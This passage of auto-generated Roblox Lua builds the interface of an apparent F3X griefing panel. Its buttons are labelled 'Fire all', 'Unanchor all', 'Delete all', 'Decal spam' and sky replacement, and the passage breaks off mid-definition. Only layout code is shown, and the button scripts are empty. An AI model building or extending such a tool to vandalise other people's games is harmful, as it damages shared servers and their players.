		G2L["12"]["Name"] = [[destruction]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2
		G2L["13"] = Instance.new("TextButton", G2L["12"]);
		G2L["13"]["TextWrapped"] = true;
		G2L["13"]["BorderSizePixel"] = 0;
		G2L["13"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["13"]["TextSize"] = 14;
		G2L["13"]["TextScaled"] = true;
		G2L["13"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["13"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["13"]["Size"] = UDim2.new(0.28274, 0, -0.17614, 0);
		G2L["13"]["Name"] = [[sky2]];
		G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["13"]["Text"] = [[Sky2]];
		G2L["13"]["Position"] = UDim2.new(0.17708, 0, 0.38201, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.LocalScript
		G2L["14"] = Instance.new("LocalScript", G2L["13"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames
		G2L["15"] = Instance.new("Folder", G2L["13"]);
		G2L["15"]["Name"] = [[gif_frames]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.1
		G2L["16"] = Instance.new("Decal", G2L["15"]);
		G2L["16"]["Name"] = [[1]];
		G2L["16"]["Texture"] = [[http://www.roblox.com/asset/?id=9282115523]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.2
		G2L["17"] = Instance.new("Decal", G2L["15"]);
		G2L["17"]["Name"] = [[2]];
		G2L["17"]["Texture"] = [[http://www.roblox.com/asset/?id=9282120015]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.3
		G2L["18"] = Instance.new("Decal", G2L["15"]);
		G2L["18"]["Name"] = [[3]];
		G2L["18"]["Texture"] = [[http://www.roblox.com/asset/?id=9282120346]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.42
		G2L["19"] = Instance.new("Decal", G2L["15"]);
		G2L["19"]["Name"] = [[42]];
		G2L["19"]["Texture"] = [[http://www.roblox.com/asset/?id=9282140103]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.5
		G2L["1a"] = Instance.new("Decal", G2L["15"]);
		G2L["1a"]["Name"] = [[5]];
		G2L["1a"]["Texture"] = [[http://www.roblox.com/asset/?id=9282121507]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.6
		G2L["1b"] = Instance.new("Decal", G2L["15"]);
		G2L["1b"]["Name"] = [[6]];
		G2L["1b"]["Texture"] = [[http://www.roblox.com/asset/?id=9282122029]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.7
		G2L["1c"] = Instance.new("Decal", G2L["15"]);
		G2L["1c"]["Name"] = [[7]];
		G2L["1c"]["Texture"] = [[http://www.roblox.com/asset/?id=9282122427]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.4
		G2L["1d"] = Instance.new("Decal", G2L["15"]);
		G2L["1d"]["Name"] = [[4]];
		G2L["1d"]["Texture"] = [[http://www.roblox.com/asset/?id=9282120720]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.8
		G2L["1e"] = Instance.new("Decal", G2L["15"]);
		G2L["1e"]["Name"] = [[8]];
		G2L["1e"]["Texture"] = [[http://www.roblox.com/asset/?id=9282123195]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.9
		G2L["1f"] = Instance.new("Decal", G2L["15"]);
		G2L["1f"]["Name"] = [[9]];
		G2L["1f"]["Texture"] = [[http://www.roblox.com/asset/?id=9282123789]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.10
		G2L["20"] = Instance.new("Decal", G2L["15"]);
		G2L["20"]["Name"] = [[10]];
		G2L["20"]["Texture"] = [[http://www.roblox.com/asset/?id=9282124179]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.11
		G2L["21"] = Instance.new("Decal", G2L["15"]);
		G2L["21"]["Name"] = [[11]];
		G2L["21"]["Texture"] = [[http://www.roblox.com/asset/?id=9282125162]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.12
		G2L["22"] = Instance.new("Decal", G2L["15"]);
		G2L["22"]["Name"] = [[12]];
		G2L["22"]["Texture"] = [[http://www.roblox.com/asset/?id=9282125645]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.13
		G2L["23"] = Instance.new("Decal", G2L["15"]);
		G2L["23"]["Name"] = [[13]];
		G2L["23"]["Texture"] = [[http://www.roblox.com/asset/?id=9282126074]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.14
		G2L["24"] = Instance.new("Decal", G2L["15"]);
		G2L["24"]["Name"] = [[14]];
		G2L["24"]["Texture"] = [[http://www.roblox.com/asset/?id=9282126474]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.15
		G2L["25"] = Instance.new("Decal", G2L["15"]);
		G2L["25"]["Name"] = [[15]];
		G2L["25"]["Texture"] = [[http://www.roblox.com/asset/?id=9282126991]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.16
		G2L["26"] = Instance.new("Decal", G2L["15"]);
		G2L["26"]["Name"] = [[16]];
		G2L["26"]["Texture"] = [[http://www.roblox.com/asset/?id=9282127390]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.17
		G2L["27"] = Instance.new("Decal", G2L["15"]);
		G2L["27"]["Name"] = [[17]];
		G2L["27"]["Texture"] = [[http://www.roblox.com/asset/?id=9282127772]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.18
		G2L["28"] = Instance.new("Decal", G2L["15"]);
		G2L["28"]["Name"] = [[18]];
		G2L["28"]["Texture"] = [[http://www.roblox.com/asset/?id=9282128101]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.19
		G2L["29"] = Instance.new("Decal", G2L["15"]);
		G2L["29"]["Name"] = [[19]];
		G2L["29"]["Texture"] = [[http://www.roblox.com/asset/?id=9282128472]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.20
		G2L["2a"] = Instance.new("Decal", G2L["15"]);
		G2L["2a"]["Name"] = [[20]];
		G2L["2a"]["Texture"] = [[http://www.roblox.com/asset/?id=9282129029]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.21
		G2L["2b"] = Instance.new("Decal", G2L["15"]);
		G2L["2b"]["Name"] = [[21]];
		G2L["2b"]["Texture"] = [[http://www.roblox.com/asset/?id=9282129378]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.22
		G2L["2c"] = Instance.new("Decal", G2L["15"]);
		G2L["2c"]["Name"] = [[22]];
		G2L["2c"]["Texture"] = [[http://www.roblox.com/asset/?id=9282130080]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.23
		G2L["2d"] = Instance.new("Decal", G2L["15"]);
		G2L["2d"]["Name"] = [[23]];
		G2L["2d"]["Texture"] = [[http://www.roblox.com/asset/?id=9282130496]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.24
		G2L["2e"] = Instance.new("Decal", G2L["15"]);
		G2L["2e"]["Name"] = [[24]];
		G2L["2e"]["Texture"] = [[http://www.roblox.com/asset/?id=9282130919]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.25
		G2L["2f"] = Instance.new("Decal", G2L["15"]);
		G2L["2f"]["Name"] = [[25]];
		G2L["2f"]["Texture"] = [[http://www.roblox.com/asset/?id=9282131320]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.26
		G2L["30"] = Instance.new("Decal", G2L["15"]);
		G2L["30"]["Name"] = [[26]];
		G2L["30"]["Texture"] = [[http://www.roblox.com/asset/?id=9282132188]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.27
		G2L["31"] = Instance.new("Decal", G2L["15"]);
		G2L["31"]["Name"] = [[27]];
		G2L["31"]["Texture"] = [[http://www.roblox.com/asset/?id=9282132983]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.28
		G2L["32"] = Instance.new("Decal", G2L["15"]);
		G2L["32"]["Name"] = [[28]];
		G2L["32"]["Texture"] = [[http://www.roblox.com/asset/?id=9282134027]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.29
		G2L["33"] = Instance.new("Decal", G2L["15"]);
		G2L["33"]["Name"] = [[29]];
		G2L["33"]["Texture"] = [[http://www.roblox.com/asset/?id=9282134596]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.30
		G2L["34"] = Instance.new("Decal", G2L["15"]);
		G2L["34"]["Name"] = [[30]];
		G2L["34"]["Texture"] = [[http://www.roblox.com/asset/?id=9282135188]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.31
		G2L["35"] = Instance.new("Decal", G2L["15"]);
		G2L["35"]["Name"] = [[31]];
		G2L["35"]["Texture"] = [[http://www.roblox.com/asset/?id=9282135611]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.32
		G2L["36"] = Instance.new("Decal", G2L["15"]);
		G2L["36"]["Name"] = [[32]];
		G2L["36"]["Texture"] = [[http://www.roblox.com/asset/?id=9282135996]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.33
		G2L["37"] = Instance.new("Decal", G2L["15"]);
		G2L["37"]["Name"] = [[33]];
		G2L["37"]["Texture"] = [[http://www.roblox.com/asset/?id=9282136340]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.34
		G2L["38"] = Instance.new("Decal", G2L["15"]);
		G2L["38"]["Name"] = [[34]];
		G2L["38"]["Texture"] = [[http://www.roblox.com/asset/?id=9282136848]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.35
		G2L["39"] = Instance.new("Decal", G2L["15"]);
		G2L["39"]["Name"] = [[35]];
		G2L["39"]["Texture"] = [[http://www.roblox.com/asset/?id=9282137385]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.36
		G2L["3a"] = Instance.new("Decal", G2L["15"]);
		G2L["3a"]["Name"] = [[36]];
		G2L["3a"]["Texture"] = [[http://www.roblox.com/asset/?id=9282137881]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.37
		G2L["3b"] = Instance.new("Decal", G2L["15"]);
		G2L["3b"]["Name"] = [[37]];
		G2L["3b"]["Texture"] = [[http://www.roblox.com/asset/?id=9282138246]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.38
		G2L["3c"] = Instance.new("Decal", G2L["15"]);
		G2L["3c"]["Name"] = [[38]];
		G2L["3c"]["Texture"] = [[http://www.roblox.com/asset/?id=9282138675]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.39
		G2L["3d"] = Instance.new("Decal", G2L["15"]);
		G2L["3d"]["Name"] = [[39]];
		G2L["3d"]["Texture"] = [[http://www.roblox.com/asset/?id=9282138998]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.40
		G2L["3e"] = Instance.new("Decal", G2L["15"]);
		G2L["3e"]["Name"] = [[40]];
		G2L["3e"]["Texture"] = [[http://www.roblox.com/asset/?id=9282139388]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.gif_frames.41
		G2L["3f"] = Instance.new("Decal", G2L["15"]);
		G2L["3f"]["Name"] = [[41]];
		G2L["3f"]["Texture"] = [[http://www.roblox.com/asset/?id=9282139730]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.UITextSizeConstraint
		G2L["40"] = Instance.new("UITextSizeConstraint", G2L["13"]);
		G2L["40"]["MaxTextSize"] = 22;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky
		G2L["41"] = Instance.new("TextButton", G2L["12"]);
		G2L["41"]["TextWrapped"] = true;
		G2L["41"]["BorderSizePixel"] = 0;
		G2L["41"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["41"]["TextSize"] = 14;
		G2L["41"]["TextScaled"] = true;
		G2L["41"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["41"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["41"]["Size"] = UDim2.new(0.28274, 0, 0.19035, 0);
		G2L["41"]["Name"] = [[sky]];
		G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["41"]["Text"] = [[Sky]];
		G2L["41"]["Position"] = UDim2.new(0.17708, 0, 0.1379, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky.LocalScript
		G2L["42"] = Instance.new("LocalScript", G2L["41"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky.TextBox
		G2L["43"] = Instance.new("TextBox", G2L["41"]);
		G2L["43"]["CursorPosition"] = -1;
		G2L["43"]["PlaceholderColor3"] = Color3.fromRGB(207, 0, 0);
		G2L["43"]["BorderSizePixel"] = 0;
		G2L["43"]["TextWrapped"] = true;
		G2L["43"]["TextSize"] = 94;
		G2L["43"]["TextColor3"] = Color3.fromRGB(81, 87, 145);
		G2L["43"]["TextScaled"] = true;
		G2L["43"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
		G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["43"]["PlaceholderText"] = [[sky 1 image id...]];
		G2L["43"]["Size"] = UDim2.new(1.93347, 0, 0.99859, 0);
		G2L["43"]["Position"] = UDim2.new(1.25501, 0, 0, 0);
		G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["43"]["Text"] = [[]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky.TextBox.UITextSizeConstraint
		G2L["44"] = Instance.new("UITextSizeConstraint", G2L["43"]);
		G2L["44"]["MaxTextSize"] = 42;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.sky.UITextSizeConstraint
		G2L["45"] = Instance.new("UITextSizeConstraint", G2L["41"]);
		G2L["45"]["MaxTextSize"] = 29;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.UIStroke
		G2L["46"] = Instance.new("UIStroke", G2L["12"]);
		G2L["46"]["Thickness"] = 2;
		G2L["46"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.TextLabel
		G2L["47"] = Instance.new("TextLabel", G2L["12"]);
		G2L["47"]["TextWrapped"] = true;
		G2L["47"]["BorderSizePixel"] = 0;
		G2L["47"]["TextSize"] = 14;
		G2L["47"]["TextScaled"] = true;
		G2L["47"]["BackgroundColor3"] = Color3.fromRGB(7, 9, 19);
		G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["47"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["47"]["Size"] = UDim2.new(1, 0, 0.13223, 0);
		G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["47"]["Text"] = [[Destruction]];
		G2L["47"]["Position"] = UDim2.new(0, 0, 0.86777, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.TextLabel.UIStroke
		G2L["48"] = Instance.new("UIStroke", G2L["47"]);
		G2L["48"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["48"]["Thickness"] = 2;
		G2L["48"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.TextLabel.UITextSizeConstraint
		G2L["49"] = Instance.new("UITextSizeConstraint", G2L["47"]);
		G2L["49"]["MaxTextSize"] = 28;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.fire
		G2L["4a"] = Instance.new("TextButton", G2L["12"]);
		G2L["4a"]["TextWrapped"] = true;
		G2L["4a"]["BorderSizePixel"] = 0;
		G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["4a"]["TextSize"] = 14;
		G2L["4a"]["TextScaled"] = true;
		G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["4a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["4a"]["Size"] = UDim2.new(0.29518, 0, -0.17596, 0);
		G2L["4a"]["Name"] = [[fire]];
		G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4a"]["Text"] = [[Fire all]];
		G2L["4a"]["Position"] = UDim2.new(0.56672, 0, 0.38192, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.fire.LocalScript
		G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.fire.UITextSizeConstraint
		G2L["4c"] = Instance.new("UITextSizeConstraint", G2L["4a"]);
		G2L["4c"]["MaxTextSize"] = 42;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.unanchor
		G2L["4d"] = Instance.new("TextButton", G2L["12"]);
		G2L["4d"]["TextWrapped"] = true;
		G2L["4d"]["BorderSizePixel"] = 0;
		G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["4d"]["TextSize"] = 14;
		G2L["4d"]["TextScaled"] = true;
		G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["4d"]["RichText"] = true;
		G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["4d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["4d"]["Size"] = UDim2.new(0.28378, 0, -0.16862, 0);
		G2L["4d"]["Name"] = [[unanchor]];
		G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4d"]["Text"] = [[Unanchor all]];
		G2L["4d"]["Position"] = UDim2.new(0.17656, 0, 0.62464, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.unanchor.LocalScript
		G2L["4e"] = Instance.new("LocalScript", G2L["4d"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.unanchor.UITextSizeConstraint
		G2L["4f"] = Instance.new("UITextSizeConstraint", G2L["4d"]);
		G2L["4f"]["MaxTextSize"] = 32;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.delete
		G2L["50"] = Instance.new("TextButton", G2L["12"]);
		G2L["50"]["TextWrapped"] = true;
		G2L["50"]["BorderSizePixel"] = 0;
		G2L["50"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["50"]["TextSize"] = 14;
		G2L["50"]["TextScaled"] = true;
		G2L["50"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["50"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["50"]["Size"] = UDim2.new(0.29758, 0, -0.16936, 0);
		G2L["50"]["Name"] = [[delete]];
		G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["50"]["Text"] = [[Delete all]];
		G2L["50"]["Position"] = UDim2.new(0.56552, 0, 0.62427, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.delete.LocalScript
		G2L["51"] = Instance.new("LocalScript", G2L["50"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.delete.UITextSizeConstraint
		G2L["52"] = Instance.new("UITextSizeConstraint", G2L["50"]);
		G2L["52"]["MaxTextSize"] = 34;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.neon
		G2L["53"] = Instance.new("TextButton", G2L["12"]);
		G2L["53"]["TextWrapped"] = true;
		G2L["53"]["BorderSizePixel"] = 0;
		G2L["53"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["53"]["TextSize"] = 14;
		G2L["53"]["TextScaled"] = true;
		G2L["53"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["53"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["53"]["Size"] = UDim2.new(0.14851, 0, -0.17718, 0);
		G2L["53"]["Name"] = [[neon]];
		G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["53"]["Text"] = [[Neon all]];
		G2L["53"]["Position"] = UDim2.new(0.86116, 0, 0.38149, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.neon.LocalScript
		G2L["54"] = Instance.new("LocalScript", G2L["53"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.neon.UITextSizeConstraint
		G2L["55"] = Instance.new("UITextSizeConstraint", G2L["53"]);
		G2L["55"]["MaxTextSize"] = 20;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.color
		G2L["56"] = Instance.new("TextButton", G2L["12"]);
		G2L["56"]["TextWrapped"] = true;
		G2L["56"]["BorderSizePixel"] = 0;
		G2L["56"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["56"]["TextSize"] = 14;
		G2L["56"]["TextScaled"] = true;
		G2L["56"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["56"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["56"]["Size"] = UDim2.new(0.15032, 0, -0.17068, 0);
		G2L["56"]["Name"] = [[color]];
		G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["56"]["Text"] = [[Color all]];
		G2L["56"]["Position"] = UDim2.new(0.86206, 0, 0.62361, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.color.LocalScript
		G2L["57"] = Instance.new("LocalScript", G2L["56"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.color.UITextSizeConstraint
		G2L["58"] = Instance.new("UITextSizeConstraint", G2L["56"]);
		G2L["58"]["MaxTextSize"] = 20;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.decal
		G2L["59"] = Instance.new("TextButton", G2L["12"]);
		G2L["59"]["TextWrapped"] = true;
		G2L["59"]["BorderSizePixel"] = 0;
		G2L["59"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["59"]["TextSize"] = 14;
		G2L["59"]["TextScaled"] = true;
		G2L["59"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["59"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["59"]["Size"] = UDim2.new(0.53072, 0, 0.06676, 0);
		G2L["59"]["Name"] = [[decal]];
		G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["59"]["Text"] = [[Decal spam]];
		G2L["59"]["Position"] = UDim2.new(0.30108, 0, 0.7795, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.decal.LocalScript
		G2L["5a"] = Instance.new("LocalScript", G2L["59"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.decal.UITextSizeConstraint
		G2L["5b"] = Instance.new("UITextSizeConstraint", G2L["59"]);
		G2L["5b"]["MaxTextSize"] = 16;
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.decal.decal
		G2L["5c"] = Instance.new("TextBox", G2L["59"]);
		G2L["5c"]["CursorPosition"] = -1;
		G2L["5c"]["Name"] = [[decal]];
		G2L["5c"]["PlaceholderColor3"] = Color3.fromRGB(207, 0, 0);
		G2L["5c"]["BorderSizePixel"] = 0;
		G2L["5c"]["TextWrapped"] = true;
		G2L["5c"]["TextSize"] = 14;
		G2L["5c"]["TextColor3"] = Color3.fromRGB(81, 87, 145);
		G2L["5c"]["TextScaled"] = true;
		G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
		G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["5c"]["PlaceholderText"] = [[decal id...]];
		G2L["5c"]["Size"] = UDim2.new(0.60967, 0, 0.94872, 0);
		G2L["5c"]["Position"] = UDim2.new(1.07801, 0, 0.00823, 0);
		G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5c"]["Text"] = [[]];
	
	
		-- StarterGui.f3xmain2.Frame.main.destruction.decal.decal.UITextSizeConstraint
		G2L["5d"] = Instance.new("UITextSizeConstraint", G2L["5c"]);
		G2L["5d"]["MaxTextSize"] = 42;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc
		G2L["5e"] = Instance.new("Frame", G2L["10"]);
		G2L["5e"]["BorderSizePixel"] = 0;
		G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
		G2L["5e"]["Size"] = UDim2.new(0.44983, 0, 0.89573, 0);
		G2L["5e"]["Position"] = UDim2.new(0.52466, 0, 0.04151, 0);
		G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5e"]["Name"] = [[misc]];
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.UIStroke
		G2L["5f"] = Instance.new("UIStroke", G2L["5e"]);
		G2L["5f"]["Thickness"] = 2;
		G2L["5f"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.TextLabel
		G2L["60"] = Instance.new("TextLabel", G2L["5e"]);
		G2L["60"]["TextWrapped"] = true;
		G2L["60"]["BorderSizePixel"] = 0;
		G2L["60"]["TextSize"] = 14;
		G2L["60"]["TextScaled"] = true;
		G2L["60"]["BackgroundColor3"] = Color3.fromRGB(7, 9, 19);
		G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["60"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["60"]["Size"] = UDim2.new(1, 0, 0.13223, 0);
		G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["60"]["Text"] = [[Misc]];
		G2L["60"]["Position"] = UDim2.new(0, 0, 0.86777, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.TextLabel.UIStroke
		G2L["61"] = Instance.new("UIStroke", G2L["60"]);
		G2L["61"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["61"]["Thickness"] = 2;
		G2L["61"]["Color"] = Color3.fromRGB(255, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.TextLabel.UITextSizeConstraint
		G2L["62"] = Instance.new("UITextSizeConstraint", G2L["60"]);
		G2L["62"]["MaxTextSize"] = 31;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.base
		G2L["63"] = Instance.new("TextButton", G2L["5e"]);
		G2L["63"]["TextWrapped"] = true;
		G2L["63"]["BorderSizePixel"] = 0;
		G2L["63"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["63"]["TextSize"] = 14;
		G2L["63"]["TextScaled"] = true;
		G2L["63"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["63"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["63"]["Size"] = UDim2.new(0.80548, 0, -0.14734, 0);
		G2L["63"]["Name"] = [[base]];
		G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["63"]["Text"] = [[Create baseplate]];
		G2L["63"]["Position"] = UDim2.new(0.51169, 0, 0.11407, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.base.LocalScript
		G2L["64"] = Instance.new("LocalScript", G2L["63"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.base.UITextSizeConstraint
		G2L["65"] = Instance.new("UITextSizeConstraint", G2L["63"]);
		G2L["65"]["MaxTextSize"] = 17;
	
	
		-- StarterGui.f3xmain2.Frame.main.misc.hd
		G2L["66"] = Instance.new("TextButton", G2L["5e"]);
		G2L["66"]["TextWrapped"] = true;
